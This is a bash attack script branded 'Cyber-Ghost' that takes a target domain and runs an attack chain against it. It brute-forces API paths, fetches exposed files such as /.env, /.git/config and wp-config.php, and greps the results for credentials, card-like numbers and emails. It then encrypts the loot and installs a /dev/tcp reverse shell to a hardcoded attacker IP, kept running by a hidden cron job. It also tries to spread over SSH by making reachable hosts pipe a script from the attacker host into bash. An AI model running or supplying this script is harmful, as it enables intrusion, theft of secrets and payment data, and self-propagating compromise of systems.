#!/bin/bash
set +x
clear

echo -e "\033[35m"
cat << 'EOF'
       ---_ ......._-_--.
      (|\ /      / /| \  \
      /  /     .'  -=-'   `.
     /  /    .'             )
   _/  /   .'        _.)   /
  / o   o        _.-' /  .'
  \          _.-'    / .'*|
   \______.-'//    .'.' \*|
    \|  \ | //   .'.' _ |*|
     `   \|//  .'.'_ _ _|*|
      .  .// .'.' | _ _ \*|
      \`-|\_/ /    \ _ _ \*\
       `/'\__/      \ _ _ \*\
      /^|            \ _ _ \*
     '  `             \ _ _ \
                       \_
             	   ( Cyber-Ghost )
EOF

echo -e "\033[32m github.com/sigma-cyber-ghost | t.me/sigma_cyber_ghost\033[0m"
echo -e "\033[31m------------------------------------------------------\033[0m"

read -p $'\033[36m[?] Enter Target Domain: \033[0m' domain
target="https://$domain"
loot_dir="loot_$(date +%s)"
mkdir -p "$loot_dir"

echo -e "\033[34m[*] Headless Harvesting $target...\033[0m"
timeout 30 chromium --headless --disable-gpu --no-sandbox --dump-dom "$target" > "$loot_dir/dom.html" 2>/dev/null || echo "[!] DOM scan failed." > "$loot_dir/dom.html"

echo -e "\033[34m[*] Brute-Forcing APIs...\033[0m"
echo -e "api\nv1\nlogin\ndata\nauth\nadmin" > "$loot_dir/wordlist.txt"
for path in $(cat "$loot_dir/wordlist.txt"); do
    curl -sk "$target/$path" > "$loot_dir/api_$path.json" 2>/dev/null &
done
wait

echo -e "\033[34m[*] Extracting Secrets...\033[0m"
grep -Eoi 'api[_-]?key|Bearer [A-Za-z0-9\._-]+|session|Authorization|password|token|secret|AWS_[A-Z_]{1,}|ACCESS_KEY' "$loot_dir/"* > "$loot_dir/creds.txt" || touch "$loot_dir/creds.txt"
grep -Eroi '[0-9]{13,16}' "$loot_dir/"* > "$loot_dir/cards.txt" || touch "$loot_dir/cards.txt"
grep -Eroi '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' "$loot_dir/"* > "$loot_dir/emails.txt" || touch "$loot_dir/emails.txt"

echo -e "\033[34m[*] Scraping Hidden Configs...\033[0m"
for leak in /.env /config/.env /backup.sql /debug /db.sql /phpinfo /.git/config /wp-config.php /admin/.bak; do
    curl -sk "$target$leak" >> "$loot_dir/leaks.txt" 2>/dev/null
done
grep -Ei 'api[_-]?key|password|token|session|secret' "$loot_dir/leaks.txt" > "$loot_dir/secrets.txt" || touch "$loot_dir/secrets.txt"

echo -e "\033[34m[*] Browser Storage Hijack...\033[0m"
echo "console.log(JSON.stringify({ls:localStorage, ss:sessionStorage, c:document.cookie}));" > "$loot_dir/storage.js"
timeout 20 chromium --headless --disable-gpu --no-sandbox "$target" > "$loot_dir/storage.txt" 2>/dev/null || echo "[!] Storage scan failed." > "$loot_dir/storage.txt"

echo -e "\033[33m[*] Packaging Loot...\033[0m"
tar -czf "$loot_dir/loot_bundle.tar.gz" -C "$loot_dir" . 2>/dev/null
openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -in "$loot_dir/loot_bundle.tar.gz" -out "$loot_dir/loot_bundle.enc" -pass pass:$(hostname)

echo -e "\033[31m[*] Deploying Reverse Shell...\033[0m"
attacker_ip="192.168.1.100"
attacker_port="4444"
backdoor_dir="$HOME/.cache/.ghost"
mkdir -p "$backdoor_dir"
backdoor="$backdoor_dir/ghost.sh"
echo "nohup bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1" > "$backdoor"
chmod 700 "$backdoor"

cron_path="$backdoor_dir/$(head /dev/urandom | tr -dc a-z | head -c8).sh"
cp "$backdoor" "$cron_path"
chmod 700 "$cron_path"
(crontab -l 2>/dev/null; echo "* * * * * bash $cron_path >/dev/null 2>&1") | crontab -

echo -e "\033[34m[*] Scanning for SSH Targets...\033[0m"
if [[ -f "$loot_dir/dom.html" ]]; then
    grep -oP '(?<=href="https?://)[^/"]+' "$loot_dir/dom.html" | sort -u | while read host; do
        if [[ "$host" == *"$domain"* ]] || [[ "$host" =~ ^(10\.|192\.168|172\.(1[6-9]|2[0-9]|3[0-1])) ]]; then
            echo "[>] Attempting SSH to $host..."
            ssh-keyscan -T 5 "$host" >> ~/.ssh/known_hosts 2>/dev/null
            ssh -o BatchMode=yes "$host" "curl -s http://$attacker_ip/ghost.sh | bash" 2>/dev/null &
        else
            echo "[x] Skipping external host $host"
        fi
    done
fi

echo -e "\033[35m[+] FINAL LOOT:\033[0m"
ls -lh "$loot_dir/"* | grep -v "wordlist.txt"

echo -e "\033[32m    @Sigma_Cyber_Ghost | github.com/sigma-cyber-ghost | t.me/sigma_cyber_ghost\033[0m"
echo -e "\033[36m[+] SYSTEM BROKEN :: LOOT GATHERED :: PERSISTENCE LOCKED.\033[0m"
